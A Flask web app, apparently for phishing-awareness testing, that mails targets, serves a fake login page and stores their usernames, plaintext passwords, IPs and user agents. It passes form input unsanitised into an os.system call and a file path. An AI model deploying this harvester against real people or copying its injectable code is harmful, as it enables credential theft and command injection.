import os
import sqlite3
import matplotlib.pyplot as plt
from flask import Flask, render_template, request, redirect, url_for, jsonify
from datetime import datetime

app = Flask(__name__)

DB_FILE = "phishing.db"
ARCHIVE_FOLDER = "reports_archive"

def get_db_connection():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn

# Создаём две таблицы:
# 1) victims: список жертв (email), введённых на главной странице
# 2) phishing_results: записи действий жертв ("Перешел, но не ввел", "Попался")
def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            email TEXT PRIMARY KEY,
            timestamp TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS phishing_results (
            email TEXT PRIMARY KEY,
            status TEXT,
            username TEXT,
            password TEXT,
            ip TEXT,
            user_agent TEXT,
            timestamp TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# Архивация отчёта (обе таблицы)
def archive_current_report():
    if not os.path.exists(ARCHIVE_FOLDER):
        os.makedirs(ARCHIVE_FOLDER)

    timestamp = datetime.now().strftime('%Y-%m-%d %H-%M-%S')
    archive_path = f"{ARCHIVE_FOLDER}/report_{timestamp}.db"

    conn = sqlite3.connect(DB_FILE)
    with sqlite3.connect(archive_path) as archive_conn:
        conn.backup(archive_conn)

    cursor = conn.cursor()
    cursor.execute("DELETE FROM victims")
    cursor.execute("DELETE FROM phishing_results")
    conn.commit()
    conn.close()

def get_reports_list():
    if not os.path.exists(ARCHIVE_FOLDER):
        return []
    reports = sorted(os.listdir(ARCHIVE_FOLDER), reverse=True)
    return [report.replace(".db", "") for report in reports]

def clear_reports():
    if os.path.exists(ARCHIVE_FOLDER):
        for file in os.listdir(ARCHIVE_FOLDER):
            os.remove(os.path.join(ARCHIVE_FOLDER, file))

# Генерация пироговой диаграммы:
# Считаем только "Перешел, но не ввел" и "Попался"
def generate_pie_chart(db_file=DB_FILE):
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()

    cursor.execute("SELECT COUNT(*) FROM phishing_results WHERE status = 'Ұсталды'")
    caught = cursor.fetchone()[0]

    cursor.execute("SELECT COUNT(*) FROM phishing_results WHERE status = 'Хат ашылды, бірақ ұсталған жоқ'")
    visited_no_input = cursor.fetchone()[0]

    conn.close()

    total = caught + visited_no_input

    plt.figure(figsize=(5, 5))
    if total == 0:
        plt.title("Тестілеудің нәтижелері (ақпарат жоқ)")
    else:
        labels = ['Ұсталды', 'Хат ашылды, бірақ ұсталған жоқ']
        sizes = [caught, visited_no_input]
        colors = ['red', 'yellow']
        plt.pie(sizes, labels=labels, autopct='%1.1f%%', colors=colors, startangle=90)
        plt.title("Тестілеудің нәтижелері")

    plt.savefig("static/report_chart.png")
    plt.close()

@app.route('/')
def index():
    reports = get_reports_list()
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM phishing_results")
    has_current_report = cursor.fetchone()[0] > 0
    conn.close()

    return render_template('index.html', reports=reports, has_current_report=has_current_report)

# Запуск теста:
# - Архивируем предыдущие данные
# - Сохраняем жертв в таблице victims
# - Не трогаем phishing_results (пустая до действий жертвы)
# - Отправляем письма
@app.route('/start_test', methods=['POST'])
def start_test():
    emails = request.form.getlist('email')
    if not emails:
        return jsonify({"status": "error", "message": "e-mail-дер енгізілмеген"}), 400

    normalized_emails = [email.strip().lower() for email in emails]
    unique_emails = list(dict.fromkeys(normalized_emails))
    email_list = ','.join(unique_emails)

    # Архивируем
    archive_current_report()

    # Записываем в victims
    conn = get_db_connection()
    cursor = conn.cursor()
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    for email in unique_emails:
        cursor.execute("INSERT OR IGNORE INTO victims (email, timestamp) VALUES (?, ?)", (email, now))
    conn.commit()
    conn.close()

    # Запускаем скрипт рассылки
    os.system(f"python phishing_mailer.py \"{email_list}\"")

    return jsonify({"status": "ok"})

# Фишинговая страница
# GET: если нет записи (или статус не "Попался"), ставим "Перешел, но не ввел"
# POST: обновляем/добавляем запись до "Попался"
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        email = request.args.get('email', '').strip().lower()
        if email:
            conn = get_db_connection()
            cursor = conn.cursor()
            # Проверяем, есть ли уже запись
            cursor.execute("SELECT status FROM phishing_results WHERE email = ?", (email,))
            row = cursor.fetchone()
            if row is None:
                # Нет записи -> вставляем "Перешел, но не ввел"
                cursor.execute(
                    "INSERT INTO phishing_results (email, status, timestamp) VALUES (?, ?, ?)",
                    (email, "Хат ашылды, бірақ ұсталған жоқ", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
                )
            else:
                # Если есть запись, но не "Попался", ставим "Перешел, но не ввел"
                if row["status"] != "Ұсталды":
                    cursor.execute(
                        "UPDATE phishing_results SET status=?, timestamp=? WHERE email=?",
                        ("Хат ашылды, бірақ ұсталған жоқ", datetime.now().strftime('%Y-%m-%d %H:%M:%S'), email)
                    )
            conn.commit()
            conn.close()
        return render_template("login.html", email=email)

    elif request.method == 'POST':
        email = request.form.get('email', '').strip().lower()
        username = request.form.get('username')
        password = request.form.get('password')
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        conn = get_db_connection()
        cursor = conn.cursor()

        # Ставим/обновляем статус "Попался"
        cursor.execute('''
            UPDATE phishing_results
            SET status = ?, username = ?, password = ?, ip = ?, user_agent = ?, timestamp = ?
            WHERE email = ?
        ''', ("Ұсталды", username, password, ip_address, user_agent, now, email))

        # Если не было записи, вставляем новую сразу со статусом "Попался"
        if cursor.rowcount == 0:
            cursor.execute('''
                INSERT INTO phishing_results (email, status, username, password, ip, user_agent, timestamp)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (email, "Ұсталды", username, password, ip_address, user_agent, now))

        conn.commit()
        conn.close()

        return redirect("https://www.google.com")

@app.route('/archive_report', methods=['POST'])
def archive_report():
    archive_current_report()
    return redirect(url_for('index'))

@app.route('/clear_reports', methods=['POST'])
def clear_reports_route():
    clear_reports()
    return redirect(url_for('index'))

# Просмотр архивного отчёта
@app.route('/report/<report_name>')
def view_report(report_name):
    report_path = f"{ARCHIVE_FOLDER}/{report_name}.db"
    if not os.path.exists(report_path):
        return "Есеп табылмады", 404

    conn = sqlite3.connect(report_path)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()

    # Список жертв (victims)
    cursor.execute("SELECT * FROM victims")
    victims_list = cursor.fetchall()

    # Отображаем только "Перешел, но не ввел" и "Попался"
    cursor.execute('''
        SELECT email, status, username, password, ip, timestamp
        FROM phishing_results
        WHERE status IN ('Хат ашылды, бірақ ұсталған жоқ', 'Ұсталды')
    ''')
    results = cursor.fetchall()
    conn.close()

    generate_pie_chart(db_file=report_path)
    return render_template('reports.html', victims_list=victims_list, results=results, report_name=report_name)

# Просмотр текущего отчёта
@app.route('/reports')
def reports():
    conn = get_db_connection()
    cursor = conn.cursor()

    # victims: список адресов
    cursor.execute("SELECT email FROM victims")
    victims_list = [row[0] for row in cursor.fetchall()]

    # phishing_results: только "Перешел, но не ввел" и "Попался"
    cursor.execute('''
        SELECT email, status, username, password, ip, timestamp
        FROM phishing_results
        WHERE status IN ('Хат ашылды, бірақ ұсталған жоқ', 'Ұсталды')
    ''')
    results = cursor.fetchall()

    conn.close()

    generate_pie_chart()
    return render_template('reports.html', victims_list=victims_list, results=results, report_name=None)

if __name__ == '__main__':
    app.run(debug=True)
